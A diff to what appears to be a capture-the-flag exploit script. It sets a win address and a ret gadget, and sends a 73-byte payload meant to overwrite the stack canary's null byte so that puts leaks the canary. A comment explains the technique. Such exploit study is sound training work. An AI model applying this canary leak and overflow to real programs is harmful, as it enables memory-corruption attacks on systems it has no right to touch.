@@ -14,15 +14,15 @@ win_addr = 0x401236
 ret_gadget = 0x40101a
 
 # those addresses are not beeing used
-buf_rbp_dist = 0x7fffffffdb70 - 0x7fffffffdb20
-buf_rip_dist = 0x7fffffffdb78 - 0x7fffffffdb20
-BUF_SIZE = 64
+#buf_rbp_dist = 0x7fffffffdb70 - 0x7fffffffdb20
+#buf_rip_dist = 0x7fffffffdb78 - 0x7fffffffdb20
+#BUF_SIZE = 64
 
-print(f'buf rbp: {hex(buf_rbp_dist)}. buf rip: {hex(buf_rip_dist)}')
+#print(f'buf rbp: {hex(buf_rbp_dist)}. buf rip: {hex(buf_rip_dist)}')
 
 # sending 73 A. because, we have to fill the buffer until the canary, +1 A to replace the 0x00 last byte of the canary. this is needed because puts will print everything until a \0 is found, so
 # we have to delete the 0 from the canary. doing so will assure to receive 73A + the 7 remaining bytes of the canary + garbage until a \0 is found in memory
-payload = b'A' * 73#(BUF_SIZE + 1)
+payload = b'A' * 73
 
 p.recvuntil(b'chatting.')
 
